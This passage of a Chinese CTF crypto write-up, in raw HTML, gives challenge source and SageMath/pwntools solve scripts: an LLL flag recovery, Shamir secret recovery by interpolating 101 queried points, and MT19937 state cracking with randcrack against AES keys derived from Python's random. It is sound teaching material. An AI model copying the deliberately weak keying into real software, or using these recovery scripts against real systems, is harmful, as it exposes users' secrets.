vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">leak = <span class="number">0.930663173858708735013864574261632487708466528608503618563619854272677238694112204757817175383567864768566170130001514302467697072153084760545849543698249360760783987526742296036337216144968878436793442305949050751417113202760217838648422727760945579644861599148512584771382319668482598215317149996430</span></span><br><span class="line">acos = arccos(leak)</span><br><span class="line">RF = RealField(<span class="number">1000</span>)</span><br><span class="line"><span class="comment"># RealField可以指定精度，RF默认53位</span></span><br><span class="line">pi = RF(pi)</span><br><span class="line">M = Matrix(QQ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">800</span>],[<span class="number">0</span>,<span class="number">2</span>^<span class="number">376</span>,<span class="number">2</span>^<span class="number">800</span>*acos],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">800</span>*<span class="number">2</span>*pi]])</span><br><span class="line">m = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>暂时还没搞懂<code>2**760</code>是怎么可以配平的</p><h3 id="shamir"><a class="markdownIt-Anchor" href="#shamir"></a> Shamir</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> __          __  _                            _______       _____ _                     _      </span></span><br><span class="line"><span class="string"> \ \        / / | |                          |__   __|     / ____| |                   (_)     </span></span><br><span class="line"><span class="string">  \ \  /\  / /__| | ___ ___  _ __ ___   ___     | | ___   | (___ | |__   __ _ _ __ ___  _ _ __ </span></span><br><span class="line"><span class="string">   \ \/  \/ / _ \ |/ __/ _ \| &#x27;_ ` _ \ / _ \    | |/ _ \   \___ \| &#x27;_ \ / _` | &#x27;_ ` _ \| | &#x27;__|</span></span><br><span class="line"><span class="string">    \  /\  /  __/ | (_| (_) | | | | | |  __/    | | (_) |  ____) | | | | (_| | | | | | | | |   </span></span><br><span class="line"><span class="string">     \/  \/ \___|_|\___\___/|_| |_| |_|\___|    |_|\___/  |_____/|_| |_|\__,_|_| |_| |_|_|_|   </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line"></span><br><span class="line">flag = getenv(<span class="string">&quot;GZCTF_FLAG&quot;</span>,<span class="string">&quot;GZCTF_NOT_DEFINE&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line">coefficients = [m] + [random.randrange(<span class="number">1</span>,n-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(coefficients)):</span><br><span class="line">        <span class="built_in">sum</span> += coefficients[i]*<span class="built_in">pow</span>(x,i,n) % n</span><br><span class="line">        <span class="built_in">sum</span> %= n</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please Input x: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Allowed!!!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    res = (x,f(x))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>100</mn></msub><msup><mi>x</mi><mn>100</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">f(x)=flag+a_{1}x+a_{2}x^{2}+a_{3}x^{3}+...+a_{100}x^{100}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span></p><p>这里<code>flag</code>即秘密，<code>x</code>由我们输入</p><p>已知，<code>Shamir门限方案</code>是基于多项式的拉格朗日插值公式<br />具体原理可看<a href="https://tangcuxiaojikuai.xyz/post/97bbcbc9.html">糖醋小鸡块师傅的博客</a></p><blockquote><p>所以当有足够多的点( t 次多项式需要 t+1 个点)进行插值时，就可以代入 0 进入插值多项式，解出的常数项即为秘密消息 secret</p></blockquote><p>所以我们需要101个点，这里用<code>SageMath</code>自带的拉格朗日函数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(host,port)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;n = &quot;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">PT = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;Please Input x:&quot;</span>,<span class="built_in">str</span>(i+<span class="number">1</span>).encode())</span><br><span class="line">    res = <span class="built_in">eval</span>(sh.recvline().decode())</span><br><span class="line">    PT.append(res)</span><br><span class="line">    </span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">recover_f = R.lagrange_polynomial(PT)</span><br><span class="line">m = recover_f(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h1 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h1><h2 id="crypto-4"><a class="markdownIt-Anchor" href="#crypto-4"></a> Crypto</h2><h3 id="mt19937"><a class="markdownIt-Anchor" href="#mt19937"></a> MT19937</h3><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> my_own_flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MT_19937</span>(<span class="params">num,en_c</span>):</span><br><span class="line">    seed1 = os.urandom(<span class="number">16</span>)</span><br><span class="line">    random.seed(seed1)</span><br><span class="line">    number = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        number.append(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">    cal = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num,num+en_c):</span><br><span class="line">        cal += random.getrandbits(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> number,cal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cal,flag</span>):</span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(cal).encode()).digest()</span><br><span class="line">    A = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    c = A.encrypt(pad(flag,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    LEN = <span class="built_in">len</span>(flag)</span><br><span class="line">    m1,m2 = flag[:LEN//<span class="number">2</span>],flag[LEN//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    Num = <span class="number">624</span></span><br><span class="line">    <span class="comment"># encrypt m1</span></span><br><span class="line">    K1 = MT_19937(Num,Num)</span><br><span class="line">    c1 = encrypt(K1[<span class="number">1</span>],m1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encrypt m1</span></span><br><span class="line">    K2 = MT_19937(Num, Num//<span class="number">4</span>)</span><br><span class="line">    c2 = encrypt(K2[<span class="number">1</span>], m2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(K1[<span class="number">0</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(K2[<span class="number">0</span>][:<span class="number">600</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(c1)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(c2)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">k1 = [<span class="number">1212937457</span>, <span class="number">714280275</span>, <span class="number">2934808054</span>, <span class="number">289447810</span>, <span class="number">634020656</span>, <span class="number">2582053193</span>, <span class="number">2648476152</span>, <span class="number">3584472561</span>, <span class="number">2877037797</span>, <span class="number">1051288028</span>, <span class="number">3007240724</span>, <span class="number">3583122714</span>, <span class="number">2377373219</span>, <span class="number">2233668169</span>, <span class="number">2300136290</span>, <span class="number">4277363949</span>, <span class="number">572508719</span>, <span class="number">3707687803</span>, <span class="number">868724505</span>, <span class="number">2234515288</span>, <span class="number">2182162330</span>, <span class="number">2354654192</span>, <span class="number">3676064525</span>, <span class="number">16386761</span>, <span class="number">1934246009</span>, <span class="number">396534601</span>, <span class="number">3406538372</span>, <span class="number">1978740790</span>, <span class="number">51554945</span>, <span class="number">1642830773</span>, <span class="number">3255471879</span>, <span class="number">249329746</span>, <span class="number">1871028531</span>, <span class="number">1670146144</span>, <span class="number">3955249559</span>, <span class="number">3523216280</span>, <span class="number">4225679888</span>, <span class="number">1979625069</span>, <span class="number">1711120506</span>, <span class="number">4224015378</span>, <span class="number">2357192253</span>, <span class="number">1437719734</span>, <span class="number">1861766583</span>, <span class="number">252037050</span>, <span class="number">3805173581</span>, <span class="number">3845899039</span>, <span class="number">239338040</span>, <span class="number">3335618070</span>, <span class="number">1909354144</span>, <span class="number">2380236080</span>, <span class="number">3120658839</span>, <span class="number">2738735651</span>, <span class="number">1749563272</span>, <span class="number">4028406006</span>, <span class="number">198730175</span>, <span class="number">4095736523</span>, <span class="number">2224365497</span>, <span class="number">1850797931</span>, <span class="number">123559677</span>, <span class="number">277130374</span>, <span class="number">1547602417</span>, <span class="number">2312967225</span>, <span class="number">1064405558</span>, <span class="number">620877831</span>, <span class="number">4182002366</span>, <span class="number">2717144120</span>, <span class="number">2424475877</span>, <span class="number">1261886189</span>, <span class="number">2666842961</span>, <span class="number">1250633055</span>, <span class="number">1445939400</span>, <span class="number">2496676732</span>, <span class="number">46718503</span>, <span class="number">1726056600</span>, <span class="number">2892333819</span>, <span class="number">3874613567</span>, <span class="number">2801764620</span>, <span class="number">3279121957</span>, <span class="number">62950328</span>, <span class="number">14090298</span>, <span class="number">3016963976</span>, <span class="number">235881318</span>, <span class="number">1152787765</span>, <span class="number">3549713637</span>, <span class="number">3184265794</span>, <span class="number">461262349</span>, <span class="number">1835258817</span>, <span class="number">706701716</span>, <span class="number">366259495</span>, <span class="number">2484440259</span>, <span class="number">2306336615</span>, <span class="number">2418024433</span>, <span class="number">107268664</span>, <span class="number">3018120752</span>, <span class="number">3915797798</span>, <span class="number">1685880034</span>, <span class="number">2782876985</span>, <span class="number">2876720582</span>, <span class="number">3803172243</span>, <span class="number">1745503879</span>, <span class="number">1965535595</span>, <span class="number">2831775453</span>, <span class="number">3139448870</span>, <span class="number">770826076</span>, <span class="number">559187920</span>, <span class="number">4292272948</span>, <span class="number">86904027</span>, <span class="number">1821662944</span>, <span class="number">58381562</span>, <span class="number">250790584</span>, <span class="number">2122997254</span>, <span class="number">2937312684</span>, <span class="number">3225034461</span>, <span class="number">1493971528</span>, <span class="number">913420791</span>, <span class="number">2911905254</span>, <span class="number">2938402784</span>, <span class="number">1430747115</span>, <span class="number">2654595902</span>, <span class="number">3315197237</span>, <span class="number">602765188</span>, <span class="number">1471009311</span>, <span class="number">3788529131</span>, <span class="number">913593424</span>, <span class="number">3280524381</span>, <span class="number">1554400422</span>, <span class="number">3250536147</span>, <span class="number">3480550436</span>, <span class="number">821401975</span>, <span class="number">3216026683</span>, <span class="number">762420368</span>, <span class="number">1733854366</span>, <span class="number">2395038075</span>, <span class="number">533527872</span>, <span class="number">3040490234</span>, <span class="number">2855012365</span>, <span class="number">2984904790</span>, <span class="number">2830464734</span>, <span class="number">2200935030</span>, <span class="number">523059886</span>, <span class="number">3795772367</span>, <span class="number">2905400361</span>, <span class="number">667720140</span>, <span class="number">3155311553</span>, <span class="number">1860651089</span>, <span class="number">1053555607</span>, <span class="number">2889478721</span>, <span class="number">1812821011</span>, <span class="number">3391980212</span>, <span class="number">3433665687</span>, <span class="number">2480476597</span>, <span class="number">1319654037</span>, <span class="number">1076583906</span>, <span class="number">2287201297</span>, <span class="number">966928688</span>, <span class="number">2542225146</span>, <span class="number">2246098689</span>, <span class="number">3117124345</span>, <span class="number">1844896511</span>, <span class="number">3104215564</span>, <span class="number">1303510082</span>, <span class="number">2924158615</span>, <span class="number">3648677443</span>, <span class="number">3308489255</span>, <span class="number">3809196505</span>, <span class="number">3199516268</span>, <span class="number">2254502655</span>, <span class="number">2126047470</span>, <span class="number">1763846642</span>, <span class="number">3851973930</span>, <span class="number">1280609700</span>, <span class="number">2415985988</span>, <span class="number">1312349771</span>, <span class="number">2103486452</span>, <span class="number">4229394974</span>, <span class="number">1937464844</span>, <span class="number">2763672456</span>, <span class="number">1366425769</span>, <span class="number">1532462738</span>, <span class="number">1864298394</span>, <span class="number">1203192658</span>, <span class="number">3679892306</span>, <span class="number">4138733297</span>, <span class="number">39437090</span>, <span class="number">1317880030</span>, <span class="number">132948638</span>, <span class="number">2315846286</span>, <span class="number">3394291148</span>, <span class="number">3207221552</span>, <span class="number">3834885856</span>, <span class="number">2367158425</span>, <span class="number">3183864791</span>, <span class="number">3303289072</span>, <span class="number">519407526</span>, <span class="number">4127464161</span>, <span class="number">1556426685</span>, <span class="number">2427155757</span>, <span class="number">2010011401</span>, <span class="number">2823249259</span>, <span class="number">3638339516</span>, <span class="number">2266010959</span>, <span class="number">345885116</span>, <span class="number">471672470</span>, <span class="number">2713191580</span>, <span class="number">731238671</span>, <span class="number">1694687550</span>, <span class="number">2523761501</span>, <span class="number">3533913138</span>, <span class="number">163820753</span>, <span class="number">1829608711</span>, <span class="number">587056408</span>, <span class="number">1129980234</span>, <span class="number">3642159144</span>, <span class="number">2546599527</span>, <span class="number">758703728</span>, <span class="number">1713442774</span>, <span class="number">1864598338</span>, <span class="number">2763096157</span>, <span class="number">2308766766</span>, <span class="number">1132350895</span>, <span class="number">2776604596</span>, <span class="number">1921085522</span>, <span class="number">1409581297</span>, <span class="number">2643399928</span>, <span class="number">3285649744</span>, <span class="number">1248611904</span>, <span class="number">2694186262</span>, <span class="number">2676127368</span>, <span class="number">2579578748</span>, <span class="number">3784393865</span>, <span class="number">2655293049</span>, <span class="number">1378866508</span>, <span class="number">1251610536</span>, <span class="number">1048557165</span>, <span class="number">3045231444</span>, <span class="number">4236456301</span>, <span class="number">2496231577</span>, <span class="number">4118010676</span>, <span class="number">3079411364</span>, <span class="number">2425576144</span>, <span class="number">2431718306</span>, <span class="number">543894373</span>, <span class="number">118186072</span>, <span class="number">2594647421</span>, <span class="number">1833894329</span>, <span class="number">3876640493</span>, <span class="number">1916631983</span>, <span class="number">2765860034</span>, <span class="number">3905895682</span>, <span class="number">2207230275</span>, <span class="number">2554838603</span>, <span class="number">3199831939</span>, <span class="number">2516271151</span>, <span class="number">3080023814</span>, <span class="number">3594335532</span>, <span class="number">1197450849</span>, <span class="number">2621744299</span>, <span class="number">447615180</span>, <span class="number">1616950869</span>, <span class="number">3109651542</span>, <span class="number">2553431350</span>, <span class="number">4165466937</span>, <span class="number">2130063794</span>, <span class="number">1459492895</span>, <span class="number">1141470511</span>, <span class="number">948009682</span>, <span class="number">325807524</span>, <span class="number">1681494454</span>, <span class="number">3137320840</span>, <span class="number">4219461371</span>, <span class="number">609761579</span>, <span class="number">942363481</span>, <span class="number">2404858793</span>, <span class="number">1697226342</span>, <span class="number">830264373</span>, <span class="number">230968933</span>, <span class="number">831865647</span>, <span class="number">4164463522</span>, <span class="number">2968510743</span>, <span class="number">1464271639</span>, <span class="number">1397831008</span>, <span class="number">2559413030</span>, <span class="number">3515044508</span>, <span class="number">772056268</span>, <span class="number">3152446673</span>, <span class="number">3117754594</span>, <span class="number">833212973</span>, <span class="number">4252629747</span>, <span class="number">2565179775</span>, <span class="number">3005093783</span>, <span class="number">3595030314</span>, <span class="number">4042182692</span>, <span class="number">298671165</span>, <span class="number">3183128227</span>, <span class="number">3429794312</span>, <span class="number">4122368172</span>, <span class="number">1900961662</span>, <span class="number">3589294443</span>, <span class="number">3190786481</span>, <span class="number">1744404482</span>, <span class="number">1921785452</span>, <span class="number">3011999869</span>, <span class="number">642164068</span>, <span class="number">3695788414</span>, <span class="number">2275346981</span>, <span class="number">1428956574</span>, <span class="number">2697326707</span>, <span class="number">2202213004</span>, <span class="number">3287889517</span>, <span class="number">919861723</span>, <span class="number">726410498</span>, <span class="number">337174656</span>,</span><br><span class="line">      <span class="number">2417998504</span>, <span class="number">2752587611</span>, <span class="number">3856581958</span>, <span class="number">141509063</span>, <span class="number">1762431188</span>, <span class="number">2065705145</span>, <span class="number">2031960873</span>, <span class="number">1892209091</span>, <span class="number">2395039500</span>, <span class="number">1058479586</span>, <span class="number">1537034270</span>, <span class="number">502217054</span>, <span class="number">3102018820</span>, <span class="number">1433274316</span>, <span class="number">1372952271</span>, <span class="number">2918921770</span>, <span class="number">239909451</span>, <span class="number">1398298200</span>, <span class="number">2339489735</span>, <span class="number">372558373</span>, <span class="number">2263872236</span>, <span class="number">2426192905</span>, <span class="number">337209508</span>, <span class="number">3983991978</span>, <span class="number">2574803724</span>, <span class="number">2837664572</span>, <span class="number">1569892789</span>, <span class="number">2625063195</span>, <span class="number">3262762020</span>, <span class="number">24150029</span>, <span class="number">2016099290</span>, <span class="number">2239153990</span>, <span class="number">85602273</span>, <span class="number">973040529</span>, <span class="number">2956276779</span>, <span class="number">4218049523</span>, <span class="number">2043716624</span>, <span class="number">2788573458</span>, <span class="number">1218787308</span>, <span class="number">939708241</span>, <span class="number">2861205992</span>, <span class="number">2427634523</span>, <span class="number">4128874493</span>, <span class="number">2326852266</span>, <span class="number">2593724377</span>, <span class="number">1680473968</span>, <span class="number">2763572707</span>, <span class="number">4240616686</span>, <span class="number">2863701585</span>, <span class="number">3551633590</span>, <span class="number">1765256405</span>, <span class="number">2110583291</span>, <span class="number">357590304</span>, <span class="number">2511138801</span>, <span class="number">859903599</span>, <span class="number">35591840</span>, <span class="number">3786321031</span>, <span class="number">3559501147</span>, <span class="number">3107666783</span>, <span class="number">2356867678</span>, <span class="number">1369801910</span>, <span class="number">2488594855</span>, <span class="number">2148205170</span>, <span class="number">3944224524</span>, <span class="number">2219844222</span>, <span class="number">466009157</span>, <span class="number">2328231114</span>, <span class="number">2777059464</span>, <span class="number">1585865212</span>, <span class="number">2871297568</span>, <span class="number">2558165993</span>, <span class="number">1561563095</span>, <span class="number">438633926</span>, <span class="number">2619385032</span>, <span class="number">2185942244</span>, <span class="number">2501145168</span>, <span class="number">2161107203</span>, <span class="number">912485991</span>, <span class="number">3956413626</span>, <span class="number">4065963551</span>, <span class="number">1527306118</span>, <span class="number">378382496</span>, <span class="number">1016367697</span>, <span class="number">82832444</span>, <span class="number">2484726280</span>, <span class="number">867566307</span>, <span class="number">1037338825</span>, <span class="number">4291735272</span>, <span class="number">901722138</span>, <span class="number">3956112428</span>, <span class="number">1060890097</span>, <span class="number">4210262544</span>, <span class="number">2525835262</span>, <span class="number">786274933</span>, <span class="number">2563584713</span>, <span class="number">2738164238</span>, <span class="number">3438656534</span>, <span class="number">564065202</span>, <span class="number">3288501195</span>, <span class="number">1074332184</span>, <span class="number">2947775555</span>, <span class="number">3790174897</span>, <span class="number">3607901153</span>, <span class="number">2332098514</span>, <span class="number">3648669449</span>, <span class="number">3879104921</span>, <span class="number">3983960923</span>, <span class="number">548882335</span>, <span class="number">1817587379</span>, <span class="number">1555057777</span>, <span class="number">2705918139</span>, <span class="number">2755720626</span>, <span class="number">2706833366</span>, <span class="number">2947946695</span>, <span class="number">3082750952</span>, <span class="number">2323554320</span>, <span class="number">1804494628</span>, <span class="number">1677086381</span>, <span class="number">2771841028</span>, <span class="number">2470056271</span>, <span class="number">3431120732</span>, <span class="number">4073503495</span>, <span class="number">2929631518</span>, <span class="number">80800254</span>, <span class="number">605951710</span>, <span class="number">1664206366</span>, <span class="number">2498279527</span>, <span class="number">360922649</span>, <span class="number">2590660538</span>, <span class="number">3724444465</span>, <span class="number">3559953317</span>, <span class="number">3002864163</span>, <span class="number">3369368155</span>, <span class="number">1569518356</span>, <span class="number">3831143803</span>, <span class="number">4184782515</span>, <span class="number">1602338537</span>, <span class="number">2640186368</span>, <span 